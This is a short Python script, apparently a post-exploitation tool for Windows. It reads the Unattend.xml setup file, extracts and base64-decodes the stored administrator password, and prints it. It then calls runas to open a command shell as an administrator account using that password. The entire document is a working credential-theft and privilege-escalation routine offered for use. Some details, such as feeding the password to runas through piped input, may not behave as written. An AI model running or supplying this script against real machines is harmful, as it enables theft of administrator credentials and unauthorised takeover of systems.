import re, base64, subprocess

content = open(r"C:\Windows\Panther\Unattend.xml", "r", errors="ignore").read()
encoded = re.search(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", content, re.DOTALL).group(1)
password = base64.b64decode(encoded).decode("utf-16-le").rstrip("\x00")
print("[+] Decoded Password:", password)
subprocess.run(["runas", "/user:SuperAdministrator", "cmd"], input=password + "\n", text=True)
